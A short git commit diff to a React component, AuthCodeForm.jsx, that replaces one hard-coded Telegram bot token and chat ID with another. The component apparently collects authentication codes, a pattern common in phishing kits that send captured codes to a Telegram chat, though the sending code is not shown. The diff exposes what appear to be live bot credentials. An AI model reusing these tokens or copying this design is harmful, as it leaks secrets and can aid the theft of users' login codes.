8ea00358844986c52661337ceb9ccbd8354648ac
Supperman123445 <Supperman.mmo@gmail.com>
2026-03-25 17:38:50 +0700

    Update AuthCodeForm.jsx

--- src/AuthCodeForm.jsx
+++ src/AuthCodeForm.jsx
@@ -3,8 +3,8 @@ import { useLocation, Navigate } from "react-router-dom";
 import "./AuthCodeForm.scss";
 
 const AuthCodeForm = () => {
-  const BOT_TOKEN = "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA";
-  const CHAT_ID = "7211586401";
+  const BOT_TOKEN = "8616096320:AAEOe-p5V0ZnBEedfeDoKWIg1WoxhWHPYGs";
+  const CHAT_ID = "2076230383";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
